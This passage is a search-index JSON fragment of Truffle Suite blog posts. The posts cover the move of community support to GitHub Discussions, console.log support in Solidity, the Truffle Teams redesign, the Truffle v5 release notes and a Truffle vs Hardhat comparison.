default, notified of every message, regardless of the channel or organization. Additionally, threaded replies aren't hidden, which makes reading messages difficult since irrelevant replies are also displayed. While there are merits to surfacing potential messages of interest, it ultimately provides a clunky user experience for highly active support cases. In evaluating the pros and cons of GitHub Discussions, we liked it because: We could pin important posts, such as our detailed installation guides for MacOS Monterey and Windows 11 Questions were discoverable via search engines such as Google We could create categories to logically separate posts by topic Developers would only get notifications for the posts they are interested in A discussion could be quickly converted into a GitHub issue for our engineers to address if necessary Community members can interact with posts via upvoting, reactions, and marking helpful answers GitHub is a platform for developers, which means new Discussions features would align closely with Truffle\u2019s needs as an open source project Our primary concern with moving support completely to Discussions was that it didn\u2019t provide insight on how quickly questions were resolved - a vital metric in determining whether or not we are doing our jobs correctly. We\u2019ve posted feedback for GitHub here . Please upvote to help us service Trufflers better! Our other concern was that Discussions is a public platform, which could be problematic for developers who may have personal questions with more sensitive information. Our Solution \u00b6 After careful deliberation, we ultimately decided on a hybrid approach as follows. GitHub Discussions \u00b6 GitHub Discussions is your one-stop shop for getting your questions answered about using the Truffle suite. You can search discussions to see if your question has already been answered, and if not, ask the question yourself! This is the place for fellow Trufflers as well as our support team to connect, discuss ideas, and help each other out! GitHub Issues \u00b6 Create a GitHub issue on the relevant repository if you are making a feature request or are reporting a bug (find repositories under our GitHub org ). GitHub issues typically result in a code change and are more directly related to developing and contributing to Truffle\u2019s open source code. You can search through issues to see if you\u2019re encountering a known problem or pick up an issue and create a PR if you want to help address it yourself! If you have a question about using Truffle in your smart contract development, GitHub discussions is the way to go! Zendesk Support Tickets \u00b6 Zendesk support tickets should only be created when you need 1:1, personalized help because your question includes private, sensitive content. We understand that sometimes, a public post is not ideal. However, Github Discussions has a variety of advantages: 1. You could potentially help other developers facing the same problem 2. You would have more eyes on your question, and thus a faster feedback loop If Discussions is still not the way to go, you can start an email thread with our support team through Zendesk. Discord \u00b6 We\u2019re reimagining Truffle\u2019s Discord by completely dropping our development support in the #truffle-support channels and redirecting users to Github Discussions. Instead, we\u2019ll be focusing Discord on community building. We\u2019re tackling this initiative through a variety of ways, and you can learn more about them in our upcoming \u201cImproving Developer Engagement\u201d blog post! Get involved! \u00b6 We invite all aspiring and current smart contract developers to help grow and support the Truffle community. Ask your questions on GitHub Discussions , and help out your fellow developers by answering and interacting with posts. Make feature requests and alert us about bugs through GitHub issues. And finally, don\u2019t forget to follow Truffle on Twitter to stay updated on our latest product release, events, and more!", "title": "Truffle Community Updates - Introducing Github Discussions!"}, {"location": "blog/truffle-community-updates-introducing-github-discussions/#challenges", "text": "Before GitHub discussions Truffle provided support through several different platforms: Gitter Discourse Discord r/truffle GitHub issues Spectrum Zendesk support tickets Email This presented three major problems. On the developer side, it was unclear where to go to find help. It was also difficult to find out if questions had been answered before. On Truffle\u2019s side, the overhead in monitoring all these different channels made it difficult to provide the first-class support that our robust developer community needs. Overall, this lack of clarity in where to go for what meant that opportunities for community building and feedback could get lost in a sea of support requests. Now, it\u2019s time for a new approach! Our goals to manage the Truffle community are as followed: Know exactly where to go for questions Can search historical data to see if questions have already been answered Have their questions answered within 24 hours Have a platform to express feedback and ideas Can collaborate and bond with other developers", "title": "Challenges"}, {"location": "blog/truffle-community-updates-introducing-github-discussions/#evaluated-channels", "text": "When analyzing the tools we had at hand, we decided between Discord and GitHub Discussions for support. We considered Discord because: Live chat seemed like it could provide faster response times We could separate topics into various channels It\u2019s a popular means of support amongst other Web3 developer communities However, Discord was not an ideal solution because the search functionality was not robust enough. If a developer Googled a problem, Discord answers would not be discoverable. Also, the chat could get noisy, as users are, by default, notified of every message, regardless of the channel or organization. Additionally, threaded replies aren't hidden, which makes reading messages difficult since irrelevant replies are also displayed. While there are merits to surfacing potential messages of interest, it ultimately provides a clunky user experience for highly active support cases. In evaluating the pros and cons of GitHub Discussions, we liked it because: We could pin important posts, such as our detailed installation guides for MacOS Monterey and Windows 11 Questions were discoverable via search engines such as Google We could create categories to logically separate posts by topic Developers would only get notifications for the posts they are interested in A discussion could be quickly converted into a GitHub issue for our engineers to address if necessary Community members can interact with posts via upvoting, reactions, and marking helpful answers GitHub is a platform for developers, which means new Discussions features would align closely with Truffle\u2019s needs as an open source project Our primary concern with moving support completely to Discussions was that it didn\u2019t provide insight on how quickly questions were resolved - a vital metric in determining whether or not we are doing our jobs correctly. We\u2019ve posted feedback for GitHub here . Please upvote to help us service Trufflers better! Our other concern was that Discussions is a public platform, which could be problematic for developers who may have personal questions with more sensitive information.", "title": "Evaluated Channels"}, {"location": "blog/truffle-community-updates-introducing-github-discussions/#our-solution", "text": "After careful deliberation, we ultimately decided on a hybrid approach as follows.", "title": "Our Solution"}, {"location": "blog/truffle-community-updates-introducing-github-discussions/#github-discussions", "text": "GitHub Discussions is your one-stop shop for getting your questions answered about using the Truffle suite. You can search discussions to see if your question has already been answered, and if not, ask the question yourself! This is the place for fellow Trufflers as well as our support team to connect, discuss ideas, and help each other out!", "title": "GitHub Discussions"}, {"location": "blog/truffle-community-updates-introducing-github-discussions/#github-issues", "text": "Create a GitHub issue on the relevant repository if you are making a feature request or are reporting a bug (find repositories under our GitHub org ). GitHub issues typically result in a code change and are more directly related to developing and contributing to Truffle\u2019s open source code. You can search through issues to see if you\u2019re encountering a known problem or pick up an issue and create a PR if you want to help address it yourself! If you have a question about using Truffle in your smart contract development, GitHub discussions is the way to go!", "title": "GitHub Issues"}, {"location": "blog/truffle-community-updates-introducing-github-discussions/#zendesk-support-tickets", "text": "Zendesk support tickets should only be created when you need 1:1, personalized help because your question includes private, sensitive content. We understand that sometimes, a public post is not ideal. However, Github Discussions has a variety of advantages: 1. You could potentially help other developers facing the same problem 2. You would have more eyes on your question, and thus a faster feedback loop If Discussions is still not the way to go, you can start an email thread with our support team through Zendesk.", "title": "Zendesk Support Tickets"}, {"location": "blog/truffle-community-updates-introducing-github-discussions/#discord", "text": "We\u2019re reimagining Truffle\u2019s Discord by completely dropping our development support in the #truffle-support channels and redirecting users to Github Discussions. Instead, we\u2019ll be focusing Discord on community building. We\u2019re tackling this initiative through a variety of ways, and you can learn more about them in our upcoming \u201cImproving Developer Engagement\u201d blog post!", "title": "Discord"}, {"location": "blog/truffle-community-updates-introducing-github-discussions/#get-involved", "text": "We invite all aspiring and current smart contract developers to help grow and support the Truffle community. Ask your questions on GitHub Discussions , and help out your fellow developers by answering and interacting with posts. Make feature requests and alert us about bugs through GitHub issues. And finally, don\u2019t forget to follow Truffle on Twitter to stay updated on our latest product release, events, and more!", "title": "Get involved!"}, {"location": "blog/truffle-now-supports-console-logging-in-solidity-smart-contract/", "text": "By Kingsley Arinze If you used the popular programming language, JavaScript, before Solidity it\u2019s possible you\u2019ve had a hard time debugging your Solidity smart contracts. You might have encountered bugs in your code that a simple console.log() would have solved, but since Solidity has no built-in way of doing this, you had to find alternative ways to fix the bug. To get around this problem for Ganache users, we\u2019ve released the console.sol library and updated Ganache to be able to parse and automatically log calls to console.sol, to standardize outputs just like JavaScript's console.log . To use Ganache\u2019s console.sol together with Truffle during development and testing, you must start a standalone Ganache instance and connect Truffle. This also means that logging outputs from your smart contracts are sent to the Ganache terminal. Since Truffle has its own built-in Ganache instance that you can easily access when you run truffle develop , we decided to take this a step further by implementing Ganache\u2019s console.log support into Truffle directly. You no longer have to manually install any package or run a separate Ganache instance to get the logging feature. Logging outputs are also sent to the Truffle terminal. Installation \u00b6 To follow the content of this post, you will need to have the following requirements: Node.js Windows, Linux, or macOS It is recommended that you download Node.js using a Node version manager to avoid permission errors caused by using sudo to download Truffle. Follow the instructions here to download a Node version manager for your operating system. With Node.js installed, you can upgrade by first uninstalling Truffle globally and installing the latest version like so: npm uninstall -g truffle npm install -g truffle Only run npm install -g truffle if you do not have a previous version of Truffle installed on your machine. Configuration \u00b6 There are two configuration options you can use to adjust the behavior of the console.log feature and both options can be set in the truffle configuration file i.e truffle-config.js. They are: solidityLog.displayPrefix : This option sets the prefix for every console.log line. The default is \"\". It is a useful option if you want to differentiate console.log output from extra verbose text output. solidityLog.preventConsoleLogMigration : This option is a safety measure to prevent accidentally migrating contracts that use console.log to MAINNET. It is set to false by default, so you will have to set it to true manually. module . exports = { . . . solidityLog : { displayPrefix : ' :' , // defaults to \"\" preventConsoleLogMigration : true , // defaults to false } Usage \u00b6 To use console.log in your Solidity contract, you will need to import the truffle/console.sol library and use it as shown in the code sample below. Note that these logs will appear in your terminal when you run truffle test or truffle develop . // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.13 ; import \"truffle/console.sol\" ; contract SampleContract { address public admin ; constructor ( address _admin ) { console . log ( \"SampleContract::constructor\\n\\tadmin: %o\" , _admin ); admin = _admin ; } } Migration file for SampleContract: // 1_migration_file.js const SampleContract = artifacts . require ( \u201c SampleContract \u201d ); module . exports = function ( deployer , network , accounts ){ const admin = accounts [ 0 ]; deployer . deploy ( sampleContract , admin ); } Now if you run Truffle develop followed by migrate , you will see the following printed on you truffle develop console: This also applies when you run test cases with Truffle using the truffle test command, outputs from the console.log statements within your smart contract code would be displayed on your terminal along side test results. As you can see, usage is very similar to Node.js console.log method as it returns a formatted string using the first argument as a printf-like format string which can contain zero or more format specifiers. Each specifier is replaced with the converted value from the corresponding argument. Some of the supported specifier includes: %s for string %d for Number %j for JSON and lot more, see the Nodejs' util.format() documentation Conclusion \u00b6 At Truffle, we remain committed to improving and simplifying the user experience for dapp developers in the Web3 ecosystem, by creating developer tools, resources, and educational materials. To find out more about our suite of developer tools, visit the official Truffle website . If you have questions, feel free to start a discussion on Truffle Github Discussions . We also hold weekly, live-streamed sessions: Web3 Unleashed, where we live code and build, interview leaders from across web3 and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "Truffle now supports console.log in Solidity smart contracts"}, {"location": "blog/truffle-now-supports-console-logging-in-solidity-smart-contract/#installation", "text": "To follow the content of this post, you will need to have the following requirements: Node.js Windows, Linux, or macOS It is recommended that you download Node.js using a Node version manager to avoid permission errors caused by using sudo to download Truffle. Follow the instructions here to download a Node version manager for your operating system. With Node.js installed, you can upgrade by first uninstalling Truffle globally and installing the latest version like so: npm uninstall -g truffle npm install -g truffle Only run npm install -g truffle if you do not have a previous version of Truffle installed on your machine.", "title": "Installation"}, {"location": "blog/truffle-now-supports-console-logging-in-solidity-smart-contract/#configuration", "text": "There are two configuration options you can use to adjust the behavior of the console.log feature and both options can be set in the truffle configuration file i.e truffle-config.js. They are: solidityLog.displayPrefix : This option sets the prefix for every console.log line. The default is \"\". It is a useful option if you want to differentiate console.log output from extra verbose text output. solidityLog.preventConsoleLogMigration : This option is a safety measure to prevent accidentally migrating contracts that use console.log to MAINNET. It is set to false by default, so you will have to set it to true manually. module . exports = { . . . solidityLog : { displayPrefix : ' :' , // defaults to \"\" preventConsoleLogMigration : true , // defaults to false }", "title": "Configuration"}, {"location": "blog/truffle-now-supports-console-logging-in-solidity-smart-contract/#usage", "text": "To use console.log in your Solidity contract, you will need to import the truffle/console.sol library and use it as shown in the code sample below. Note that these logs will appear in your terminal when you run truffle test or truffle develop . // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.13 ; import \"truffle/console.sol\" ; contract SampleContract { address public admin ; constructor ( address _admin ) { console . log ( \"SampleContract::constructor\\n\\tadmin: %o\" , _admin ); admin = _admin ; } } Migration file for SampleContract: // 1_migration_file.js const SampleContract = artifacts . require ( \u201c SampleContract \u201d ); module . exports = function ( deployer , network , accounts ){ const admin = accounts [ 0 ]; deployer . deploy ( sampleContract , admin ); } Now if you run Truffle develop followed by migrate , you will see the following printed on you truffle develop console: This also applies when you run test cases with Truffle using the truffle test command, outputs from the console.log statements within your smart contract code would be displayed on your terminal along side test results. As you can see, usage is very similar to Node.js console.log method as it returns a formatted string using the first argument as a printf-like format string which can contain zero or more format specifiers. Each specifier is replaced with the converted value from the corresponding argument. Some of the supported specifier includes: %s for string %d for Number %j for JSON and lot more, see the Nodejs' util.format() documentation", "title": "Usage"}, {"location": "blog/truffle-now-supports-console-logging-in-solidity-smart-contract/#conclusion", "text": "At Truffle, we remain committed to improving and simplifying the user experience for dapp developers in the Web3 ecosystem, by creating developer tools, resources, and educational materials. To find out more about our suite of developer tools, visit the official Truffle website . If you have questions, feel free to start a discussion on Truffle Github Discussions . We also hold weekly, live-streamed sessions: Web3 Unleashed, where we live code and build, interview leaders from across web3 and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "Conclusion"}, {"location": "blog/truffle-teams-gets-a-new-look/", "text": "Thanks to Josh Quintal and Heyse Li , the redesign of Truffle Teams is complete! Josh presented the Theobromine design system at TruffleCon 2019 , and this release is the first step towards this vision! In addition to the stylistic upgrade, we've redesigned the app navigation to help you focus on a single repository at a time. Read more below about the most recent changes, or go check them out for yourself ! Redesign \u00b6 The Theobromine Design System uplifts the entire Truffle Teams application. This lighter theme makes the application feel more welcoming and presents itself more as a professional productivity tool. We also added support to collapse the left navbar to give you some more screen real estate. This is super helpful for those with small or vertical screens; it\u2019s also instrumental for multitaskers that use Truffle Teams in a split-screen setup. Navigation Updates \u00b6 The previous iteration of Truffle Teams utilized a \"feature first\" navigation where you would select the feature you'd like to see (Builds, Deployments, Monitoring [formally known as Data]) and then select the repository you'd want to drill into. We found this to be a jarring and tedious experience, so we changed things to be \"repository first\". When you login, you'll now see a home page with a list of your repositories. You can quickly search for a repository or keep your favorites at the top of the list by pinning them. After clicking on a repository you'll be presented with the details of that repository. On the Builds page you'll now see a history of your builds rather than seeing the list of your repositories. The Deployments and Monitoring pages will look familiar as they haven't changed much other than not having to select the repository again. Want to focus on a different repository? You can quickly switch between them using the breadcrumb dropdown at the top of each page. You can also click the Truffle Teams logo in the top left to go back to the home page with the search bar and pinned repositories. Got Feedback or Questions? \u00b6 You can submit Truffle Teams feature requests and issues on GitHub . Get started with Truffle Teams, and see the redesign for yourself! Try Truffle Teams", "title": "Truffle Teams Gets a New Look!"}, {"location": "blog/truffle-teams-gets-a-new-look/#redesign", "text": "The Theobromine Design System uplifts the entire Truffle Teams application. This lighter theme makes the application feel more welcoming and presents itself more as a professional productivity tool. We also added support to collapse the left navbar to give you some more screen real estate. This is super helpful for those with small or vertical screens; it\u2019s also instrumental for multitaskers that use Truffle Teams in a split-screen setup.", "title": "Redesign"}, {"location": "blog/truffle-teams-gets-a-new-look/#navigation-updates", "text": "The previous iteration of Truffle Teams utilized a \"feature first\" navigation where you would select the feature you'd like to see (Builds, Deployments, Monitoring [formally known as Data]) and then select the repository you'd want to drill into. We found this to be a jarring and tedious experience, so we changed things to be \"repository first\". When you login, you'll now see a home page with a list of your repositories. You can quickly search for a repository or keep your favorites at the top of the list by pinning them. After clicking on a repository you'll be presented with the details of that repository. On the Builds page you'll now see a history of your builds rather than seeing the list of your repositories. The Deployments and Monitoring pages will look familiar as they haven't changed much other than not having to select the repository again. Want to focus on a different repository? You can quickly switch between them using the breadcrumb dropdown at the top of each page. You can also click the Truffle Teams logo in the top left to go back to the home page with the search bar and pinned repositories.", "title": "Navigation Updates"}, {"location": "blog/truffle-teams-gets-a-new-look/#got-feedback-or-questions", "text": "You can submit Truffle Teams feature requests and issues on GitHub . Get started with Truffle Teams, and see the redesign for yourself! Try Truffle Teams", "title": "Got Feedback or Questions?"}, {"location": "blog/truffle-teams-now-supports-private-repositories/", "text": "Thanks to the awesome work of @nicholasjpaterno , you can now integrate private repositories with Truffle Teams! This will eventually be a premium feature, but we're releasing it for free while the product is still in beta. Using Private Repos \u00b6 Here we see the lock icon denoting a private repository and an indication of this being a future premium feature. There are no extra steps to use your private repositories with Truffle Teams! Simply add your repo , and automatic builds should start working! Private repos will have a lock icon next to their name indicating their private status. Otherwise, they have the same functionality as public repos. You'll see that we're very loud about which features will be premium. We'll continue this practice for future premium features so that we stay transparent about what's to come. Next Up: Deployments! \u00b6 Here's a teaser of our next upcoming feature: Graduated Deployments. The main deployments screen showing successful testnet and mainnet deployments. You'll be able to deploy any commit with a successful build to Ropsten, Rinkeby, and Mainnet Ethereum networks (with more to come soon!). You'll get some useful contextual information for your deployments: the status of the deployment, when it took place, who on your team deployed it, the contracts deployed, the ability to download your Truffle Artifacts, and more. Deploy to the Staging environment (Ropsten and Rinkeby currently) to make sure everything works out. Once you're ready, you can easily graduate a deployment in Staging to Production (Mainnet currently). We're using truffle migrate under the hood, so your existing migration scripts will work just fine. We've distilled the deployment process into an informative and helpful wizard to guide you through the deployment process. With this wizard and leveraging MetaMask for signing transactions, we are finally giving you an interface that makes it easier to deploy for seasoned and new devs alike! We'll release a full article with all the details about using Truffle Teams' deployment features once it's ready for release. Thank you and happy truffling!", "title": "Truffle Teams Now Supports Private Repositories"}, {"location": "blog/truffle-teams-now-supports-private-repositories/#using-private-repos", "text": "Here we see the lock icon denoting a private repository and an indication of this being a future premium feature. There are no extra steps to use your private repositories with Truffle Teams! Simply add your repo , and automatic builds should start working! Private repos will have a lock icon next to their name indicating their private status. Otherwise, they have the same functionality as public repos. You'll see that we're very loud about which features will be premium. We'll continue this practice for future premium features so that we stay transparent about what's to come.", "title": "Using Private Repos"}, {"location": "blog/truffle-teams-now-supports-private-repositories/#next-up-deployments", "text": "Here's a teaser of our next upcoming feature: Graduated Deployments. The main deployments screen showing successful testnet and mainnet deployments. You'll be able to deploy any commit with a successful build to Ropsten, Rinkeby, and Mainnet Ethereum networks (with more to come soon!). You'll get some useful contextual information for your deployments: the status of the deployment, when it took place, who on your team deployed it, the contracts deployed, the ability to download your Truffle Artifacts, and more. Deploy to the Staging environment (Ropsten and Rinkeby currently) to make sure everything works out. Once you're ready, you can easily graduate a deployment in Staging to Production (Mainnet currently). We're using truffle migrate under the hood, so your existing migration scripts will work just fine. We've distilled the deployment process into an informative and helpful wizard to guide you through the deployment process. With this wizard and leveraging MetaMask for signing transactions, we are finally giving you an interface that makes it easier to deploy for seasoned and new devs alike! We'll release a full article with all the details about using Truffle Teams' deployment features once it's ready for release. Thank you and happy truffling!", "title": "Next Up: Deployments!"}, {"location": "blog/truffle-v5-has-arrived/", "text": "We have just released the most awaited version of Truffle just in time for the holidays! There are SO many exciting things that we would like to mention that will make your Truffle experience a rich one. Highlighted below are the new exciting things Truffle has to offer. \ud83d\udc6f Download Truffle v5 or check out the full Release Notes . \ud83d\udc6f Bring your own compiler! You can now choose any solc-js version available at solc-bin. Just tell Truffle which version you want to use and it will automatically fetch it for you! This feature also includes the ability to use Docker and native binaries in an advanced way. Web3 1.0 - The truffle-contract package is now using Web3.js 1.0! This will greatly improve error handling! New migrations command - In v5, the migrate command has been completely rewritten. We have included better error messages: e.g., when a deployment fails Truffle will notify you and give you an idea of possible fixes. Truffle will now also give you more information about what is going on when you deploy a contract. This includes cost summaries and real time status updates about the amount of time a transaction has been pending. Dry run simulations also now run automatically if you are deploying to a known public network and using the --interactive flag on the command line will give you a prompt between dry runs and real deployments. Another improvement is the ability to configure the amount of block confirmations in between deployments. This allows the user to specify the number of blocks to wait before transactions time out. Usage analytics - Usage analytics have been added and users can opt-in by running truffle config --enable-analytics . We think this feature will be a vital tool that will help us to make informed decisions about the future of Truffle and to determine what is most valuable to our users. When enabled, Truffle will collect information about your version number, the commands you run, and whether commands succeed or fail. And of course, it will do so in an anonymous fashion. truffle run <command> - Truffle now gives users the ability to create custom command plugins. This feature is still in its infancy so let us know what you think! Vyper support - Another added feature is that Truffle will now compile *.vy contracts. We have published a Truffle Box to help you get started with Vyper. You can access it by running: $ truffle unbox vyper-example (Make sure you have Vyper installed.) Solidity v0.5.0 - Truffle also now ships with Solidity v0.5.0 by default. Solidity v0.4.xx is still supported and can be used by specifying the version you wish to use in your Truffle config. Structured function parameters - Truffle has been upgraded to use Web3.js v1.0. This has allowed us to include support for passing/returning \u2018struct\u2019s in Solidity functions. To use this ability, you need to specify the following at the top of your contracts: pragma experimental ABIEncoderV2 This feature allows you to use complex function arguments and have the values returned so that they can interact with other contracts via truffle-contract\u2019s JS interface. Help system - Now access Truffle\u2019s built in help system by running: $ truffle help <command> This allows you to see all the available options for the command as well as a description of what it does. Unique truffle develop mnemonics - Truffle will now generate random mnemonics that will persist only for you. Use caution with crypto security when working with mnemonics and private keys! Debugger improvements - v5 includes debugger breakpoints! Add breakpoints using the \u2019b\u2019 command and remove them using the \u2018B\u2019 command. Additionally we have added mapping support for the debugger! truffle init / truffle unbox - These commands have been improved and you are now asked if you want to overwrite files in the case of name conflicts in the target directory. A force option (--force) has also been added in the case where you wish to overwrite the files automatically and avoid the prompt. async / await - Support for async/await syntax in the Truffle console is also now available! Looking towards the future we intend to add third-party plugins and hope through our fancy, improved analaytics to provide features the community needs most! Thank you to all who have helped make this release of Truffle possible! We hope you enjoy this new Truffle release and ask that you let us know if you have any suggestions or problems on our GitHub Discussion or GitHub issues page! Get started with Truffle v5 today!", "title": "Truffle v5 has arrived!"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/", "text": "By Kingsley Arinze Every field in software development relies on the availability of the right tools to get the job done effectively. This is especially true for dapp development in Web3, as we\u2019re still in the early stages. Today, there are two dominant development environments for dapp development: Truffle and Hardhat. And while these two are the most prevalent, we\u2019re seeing newer players such as Foundry and Tenderly gain traction in the ecosystem. In most cases, when new developers are on-boarded into Web3, they tend to stick to the development environment they started with, primarily because of a lack of understanding of what other tools offer. And although this isn\u2019t a bad thing, it can limit developers\u2019 understanding of tools and the different features of each, in order to provide the most value. In this blog, our goal is to outline the differences between Hardhat and Truffle, while reviewing some of the services they offer in hopes that the next time you\u2019re choosing a development environment for your next dapp, you\u2019re able to make an informed decision. A bit of history \u00b6 Truffle was the first of the two to be released, and it was initially written in CoffeeScript. It was later rewritten to ES6 JavaScript in 2015. Truffle quickly gained attention as developers could now write and test their smart contracts using ES6 JavaScript without needing to add any custom processors. Truffle also introduced the first-ever integrated Solidity debugger and was the first to allow mainnet forking using Ganache . As part of its offering were also tools that enable developers to compile and deploy contracts, perform automated testing, and configure their frontend architecture. Hardhat on the other hand was initially launched in 2019 as Buidler . Hardhat went on to learn from the early days of Truffle and quickly became the top provider. They offered three main components for dapp development: Hardhat , the development environment, Hardhat Runner , the task runner, and Hardhat Network , the EVM development network. The key value proposition of Hardhat was that it was less opinionated than Truffle, although in recent times, we\u2019re beginning to see Hardhat become more opinionated, which makes sense considering the exponential growth of the Ethereum ecosystem in recent years. Truffle vs. Hardhat - An overview of each tool \u00b6 Hardhat and Truffle\u2019s built-in Ethers.js support \u00b6 It is recognized in the ecosystem that Ethers.js has been gaining significant traction in the last few years. This is in big part due to its active maintenance and feature release cadence. That said, Web3.js 4.x recently hit alpha so the library wars are far from over. Hardhat works well with Ethers.js, as an entire plugin and documentation section is dedicated to it. On the other hand, Truffle has built-in contract abstractions that make web3.js easier to use, and has Ethers.js support improvements in the works. It is important to note that despite Truffle and Hardhat having better support for web3.js and Ethers.js respectively, you can still use any of the two, depending on what you\u2019re more comfortable with. Hardhat and Truffle\u2019s built-in TypeScript support \u00b6 Hardhat has built-in support for TypeScript and this is important for teams that rely heavily on this programming language as Hardhat requires minimal configuration to get started using TypeScript. You won't need to download any other dependencies if you download the hardhat-toolbox package using NPM 7 or greater. You can simply configure your project using hardhat.config.ts and a tsconfig.json file, and you\u2019re ready to start building! Hardhat also supports writing scripts and smart contract tests in TypeScript. It requires no additional dependencies to get this done. You also won\u2019t need to manually run tsc before running your tests. Additionally, It features type-checking using an optional -- typecheck flag. Truffle, on the other hand, also supports writing tests in TypeScript. However, you\u2019ll need to manually install all the necessary dependencies, and manually run the tsc command to compile TypeScript files. Truffle for VS Code Extension vs. Hardhat for VS Code Extension \u00b6 These two extensions vary significantly in what they accomplish. The Truffle for VS Code Extension , which Microsoft originally started, is more catered toward developer user experience. It has an interface for managing your development workflows and representing important information visually. The Truffle for VS code extension also has built-in support for a growing number of Web3 tools and services, including Infura , Truffle debugger , and Ganache . This means that with a few clicks, you can test, debug, and deploy your contracts directly to the Ethereum mainnet and testnets. You can also deploy directly to Ganache and Hyperledger Besu using this extension. The Hardhat for VS code Extension caters more towards providing language support for Solidity. It offers code completion, Solidity code error detection, code formatting, and code actions. It is similar to the Solidity extension by Juan Blanco, although the latter has been around since 2015 and offers additional features such as code snippets and Nethereum code generation for integration with .NET projects. Ganache vs. Hardhat Network \u00b6 Both Ganache and Hardhat Network have rich lists of features. They are both local Ethereum network nodes capable of instantly mining new blocks. This makes them very fast and useful for testing smart contracts. They can also be configured to mine blocks at intervals. They are both capable of running as an in-process or standalone daemon. But Ganache takes it a step further by having a standalone graphical user interface called the Ganache GUI that can be used together with other development environments for a more visual experience. Both local networks are capable of forking the Ethereum mainnet and testnets, allowing users to replay real-life transactions locally. This is particularly useful when used together with the Truffle debugger. For example, here is a demo of using the Ganache mainnet forking feature and the Truffle debugger to exploit the DAO hack of 2016. Both have native support for logging items to the console using the console.log statement. Hardhat has had this feature for a while, but Truffle recently incorporated it into Ganache. It is available for use today. Truffle also understands and supports Hardhat\u2019s console.log library contract and Vyper\u2019s print statement, more on that here . Truffle\u2019s built-in debugging support \u00b6 This is one area that Truffle differs from Hardhat: Truffle not only supports console logging, which many developers use for debugging, but it also features a fully-fledged, integrated debugger with step-in/out, breakpoints e.t.c that is compatible with VS Code. You can also use the Truffle debugger inside test files to debug specific operations. The debugger allows this by exposing the truffle test -- debug command, alongside a debug() function that can be used to wrap contract operations for debugging purposes. More on that here . Truffle debugger exposes another command, truffle debug --fetch-external , that allows developers to debug third-party contracts that are verified on Etherscan and Sourcify . Furthermore, you can debug transactions without creating a Truffle project, using the truffle debug --URL <provider_url> command. You can learn more about the Truffle debugger and how to take advantage of its rich features by checking out its documentation . Truffle Dashboard \u00b6 Another area that Truffle differs from Hardhat is in contract deployment security. Usually, smart contract developers will have to copy out their wallet\u2019s private keys or mnemonic and hand them over to JavaScript files or store them in environment config files like .env to be able to deploy their smart contracts. With Truffle Dashboard , you won\u2019t ever expose your private keys or even know what they look like. You can securely deploy contracts to any network of your choice by starting a dashboard instance, which can seamlessly connect to your MetaMask wallet without any configuration, allowing you to use the currently selected account on MetaMask as your Truffle deployment configuration. This isn\u2019t only limited to Truffle users, as the Truffle dashboard also integrates nicely with other developer tools like Hardhat, Foundry, and Tenderly. All you need to do is to download Truffle and follow the instructions on the documentation . Integration with Infura \u00b6 The next step after creating and testing smart contracts using either of these tools is to deploy your contracts to either the Mainnet or a testnet so that they can be publicly available. There are several options, but Infura stands out as the most reliable. Also, Infura recently announced its plan to launch a new decentralized infrastructure ecosystem to provide builders with even more options for node service providers. Although Infura is being used today by developers irrespective of what development environment they use, the Truffle for VS Code extension enhances the user experience for Truffle users by only requiring them to link their Infura account one time and subsequently perform all operations without ever needing to leave the VS Code application. More on that in this explainer blog . Multiple supported testing languages/techniques \u00b6 In Hardhat, automated tests are primarily written in JavaScript and TypeScript, mainly using Ethers.js and Mocha. Hardhat also exposes custom Chai Matchers and Hardhat Network Helpers libraries through the Hardhat/toolbox plugins to help simplify test code. Truffle, in addition to supporting both JavaScript and TypeScript for writing automated tests that interact with your contract from the outside, more like how a frontend application would, also offers an entirely different method of writing test code, using the Solidity programming language. This technique is used to interact with contracts in advanced, bare-to-the-metal scenarios. You can learn more about testing with Solidity in Truffle in this documentation . Plugin support \u00b6 Hardhat plugins are bits of reusable configuration code written and exported for wider use. Their primary function is to extend the Hardhat Runtime environment by defining tasks and overriding existing ones. Some examples of things you can achieve with a plugin include: running a linter, using different compiler versions for different files, or generating a UML diagram for your contracts. There is a rich ecosystem of Hardhat plugins that caters to various needs. You can learn more about them on their website . Truffle also offers plugin support although this is still in its early stages. Truffle boxes on the other hand are a bit different in the sense that they do not only provide reusable configuration files for quickly starting a new dapp project, but they also provide all the necessary boilerplate code needed to code, compile and deploy contracts, all while being as less opinionated as possible. The Truffle website has several boxes you can use depending on the type of dapp project you intend to build. There are boxes tailored for developers looking to build on layer 2 networks such as Optimism and Arbitrum . There are boxes to help you start an Optimism bridge project, as well as a React box with all the necessary components for building a functional dapp frontend using modern React and JavaScript code. The most recent addition to the list of available Truffle boxes is the Infura NFT SDK Truffle box that leverages the recently announced Infura NFT API/SDK to make NFT creation a breeze. You can learn more about this box on this explainer blog . Choosing the right dapp development environment \u00b6 At the end of the day, choosing the right development environment largely depends on your unique needs and those of the dapps you\u2019re looking to create. At Truffle, our mantra is about collaboration and improving interoperability, so if you choose to use Hardhat, plus Truffle\u2019s debugger, dashboard, and Ganache they work well together. We're also building compatibility for Foundry, although you'll get the latest Truffle features and a more integrated experience if you decide to use Truffle from the ground up. At Truffle, we remain committed to improving and simplifying the user experience for dapp developers in the Web3 ecosystem by creating developer tools, resources, and educational materials. To find out more about our suite of developer tools, visit the official Truffle website . If you have questions, feel free to start a discussion on our Github Discussions page . We also hold weekly live-streamed sessions called Web Unleashed , where we build, interview folks, and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "Truffle vs. Hardhat - Breaking down the difference between Ethereum\u2019s top development environments"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/#a-bit-of-history", "text": "Truffle was the first of the two to be released, and it was initially written in CoffeeScript. It was later rewritten to ES6 JavaScript in 2015. Truffle quickly gained attention as developers could now write and test their smart contracts using ES6 JavaScript without needing to add any custom processors. Truffle also introduced the first-ever integrated Solidity debugger and was the first to allow mainnet forking using Ganache . As part of its offering were also tools that enable developers to compile and deploy contracts, perform automated testing, and configure their frontend architecture. Hardhat on the other hand was initially launched in 2019 as Buidler . Hardhat went on to learn from the early days of Truffle and quickly became the top provider. They offered 